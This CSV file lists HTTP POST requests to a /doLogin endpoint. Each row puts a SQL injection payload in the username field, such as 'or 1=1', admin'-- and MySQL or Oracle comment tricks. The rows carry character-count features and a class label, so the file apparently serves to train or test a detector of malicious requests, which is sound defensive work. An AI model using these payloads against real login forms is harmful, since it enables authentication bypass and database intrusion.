method,path,body,single_q,double_q,dashes,braces,spaces,badwords,class
POST,/doLogin,uid='%2f%2aora_mysql%2a%2fand%2f%2a%2a%2f'2'%3d'0&passw=vf&btnSubmit=Login,4,0,0,0,0,1,
POST,/doLogin,uid='%20or%20'2'%3d'2&passw=vf&btnSubmit=Login,4,0,0,0,2,1,
POST,/doLogin,uid=%23mysql&passw=vf&btnSubmit=Login,0,0,0,0,0,1,
POST,/doLogin,uid=or%201%3d1%23&passw=vf&btnSubmit=Login,0,0,0,0,1,1,
POST,/doLogin,uid=%22%20or%201%3d1%23&passw=vf&btnSubmit=Login,0,1,0,0,2,1,
POST,/doLogin,uid='&passw=vf&btnSubmit=Login,1,0,0,0,0,1,
POST,/doLogin,uid=%20and%202%3d0&passw=vf&btnSubmit=Login,0,0,0,0,2,1,
POST,/doLogin,uid=admin'--&passw=vf&btnSubmit=Login,1,0,1,0,0,1,
POST,/doLogin,uid='%20and%20'2'%3d'0'%23mysql&passw=vf&btnSubmit=Login,5,0,0,0,2,1,
POST,/doLogin,uid=%2f%2aora_mysql%2a%2fand%2f%2a%2a%2f2%3d2&passw=vf&btnSubmit=Login,0,0,0,0,0,1,
POST,/doLogin,uid=%20or%202%3d2&passw=vf&btnSubmit=Login,0,0,0,0,2,1,
POST,/doLogin,uid=admin'&passw=vf&btnSubmit=Login,1,0,0,0,0,1,
POST,/doLogin,uid=1e100&passw=vf&btnSubmit=Login,0,0,0,0,0,1,
POST,/doLogin,uid=%20and%20user()%3duser()&passw=vf&btnSubmit=Login,0,0,0,2,2,1,
POST,/doLogin,uid=order%20by%201--&passw=vf&btnSubmit=Login,0,0,1,0,2,2,
POST,/doLogin,uid=admin%27+OR+1%3D1--&passw=vf&btnSubmit=Login,1,0,1,0,0,1,
POST,/doLogin,uid=or%201%3d1&passw=vf&btnSubmit=Login,0,0,0,0,1,1,
POST,/doLogin,uid='%20and%20'2'%3d'2'%23mysql&passw=vf&btnSubmit=Login,5,0,0,0,2,1,
POST,/doLogin,uid=2%20or%202%3d2&passw=vf&btnSubmit=Login,0,0,0,0,2,1,
POST,/doLogin,uid=%20and%202%3d0%23mysql&passw=vf&btnSubmit=Login,0,0,0,0,2,1,
POST,/doLogin,uid=%2f%2aora_mysql%2a%2fand%2f%2a%2a%2f2%3d0&passw=vf&btnSubmit=Login,0,0,0,0,0,1,
POST,/doLogin,uid='test&passw=vf&btnSubmit=Login,1,0,0,0,0,1,
POST,/doLogin,uid='%20or%201%3d1--&passw=vf&btnSubmit=Login,1,0,1,0,2,1,
POST,/doLogin,uid='test--&passw=vf&btnSubmit=Login,1,0,1,0,0,1,
POST,/doLogin,uid=%20and%202%3d2--%20oracle_mysql&passw=vf&btnSubmit=Login,0,0,1,0,3,1,
POST,/doLogin,uid='%20and%20'2'%3d'2'--%20oracle&passw=vf&btnSubmit=Login,5,0,1,0,3,1,
POST,/doLogin,uid=now()&passw=vf&btnSubmit=Login,0,0,0,1,0,1,
POST,/doLogin,uid='%2f%2aora_mysql%2a%2for%2f%2a%2a%2f'2'%3d'2&passw=vf&btnSubmit=Login,4,0,0,0,0,1,
POST,/doLogin,uid='%20and%20'2'%3d'0&passw=vf&btnSubmit=Login,4,0,0,0,2,1,
POST,/doLogin,uid=2'%20or%20'2'%3d'2&passw=vf&btnSubmit=Login,4,0,0,0,2,1,
POST,/doLogin,uid='%2f%2aora_mysql%2a%2fand%2f%2a%2a%2f'2'%3d'2&passw=vf&btnSubmit=Login,4,0,0,0,0,1,
POST,/doLogin,uid=admin'%23&passw=vf&btnSubmit=Login,1,0,0,0,0,1,
POST,/doLogin,uid=or%201%3d1--&passw=vf&btnSubmit=Login,0,0,1,0,1,1,
POST,/doLogin,uid='%20and%20'2'%3d'0'--%20oracle&passw=vf&btnSubmit=Login,5,0,1,0,3,1,
POST,/doLogin,uid='%23mysql&passw=vf&btnSubmit=Login,1,0,0,0,0,1,
POST,/doLogin,uid=%20and%20USER%3dUSER&passw=vf&btnSubmit=Login,0,0,0,0,2,1,
POST,/doLogin,uid=--ora_sqls&passw=vf&btnSubmit=Login,0,0,1,0,0,1,
POST,/doLogin,uid='%20and%20'2'%3d'2&passw=vf&btnSubmit=Login,4,0,0,0,2,1,
POST,/doLogin,uid=%20and%201%3d1&passw=vf&btnSubmit=Login,0,0,0,0,2,1,
POST,/doLogin,uid=%20and%202%3d0--%20oracle_mysql&passw=vf&btnSubmit=Login,0,0,1,0,3,1,
POST,/doLogin,uid=%20and%202%3d2%23mysql&passw=vf&btnSubmit=Login,0,0,0,0,2,1,
POST,/doLogin,uid=999999999999999999&passw=vf&btnSubmit=Login,0,0,0,0,0,1,
